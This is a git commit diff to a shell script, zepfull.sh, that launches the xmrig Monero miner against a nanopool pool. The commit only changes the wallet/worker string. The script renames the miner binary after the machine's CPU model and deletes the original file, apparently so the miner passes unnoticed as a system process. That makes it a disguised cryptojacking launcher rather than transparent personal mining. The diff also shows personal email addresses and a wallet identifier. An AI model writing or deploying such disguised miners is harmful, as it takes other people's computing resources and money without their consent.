8a3c7a12c8d8c5e888fd528a245b803da04f2ed1
wollfoo <nhac.tien1988@gmail.com>
2024-11-03 15:44:04 +0700

    Update zepfull.sh

--- zepfull.sh
+++ zepfull.sh
@@ -17,7 +17,7 @@ mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
 POOL=xmr-us-east1.nanopool.org:10343
-USERNAME=44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao
+USERNAME=44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao.orcfullaz/jmayo66@yahoo.com
 ALGO=rx/0
 DONATE=1
 ./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME x -a $ALGO -k --tls
